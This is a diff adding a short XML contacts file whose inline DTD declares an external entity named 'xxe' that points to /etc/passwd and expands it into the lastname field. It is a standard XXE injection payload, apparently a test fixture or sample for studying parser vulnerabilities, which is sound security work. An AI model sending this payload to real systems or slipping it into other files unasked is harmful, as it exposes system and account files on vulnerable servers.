@@ -1,0 +1,15 @@
+<?xml version="1.0"?>
+<!DOCTYPE contacts [
+  <!ELEMENT contacts (contact*)>
+  <!ELEMENT contact (firstname,lastname)>
+  <!ELEMENT firstname (#PCDATA)>
+  <!ELEMENT lastname ANY>
+  <!ENTITY xxe SYSTEM "/etc/passwd">
+]>
+<contacts>
+ <contact>
+  <firstname>John</firstname> 
+  <lastname>&xxe;</lastname>
+ </contact> 
+</contacts>
+
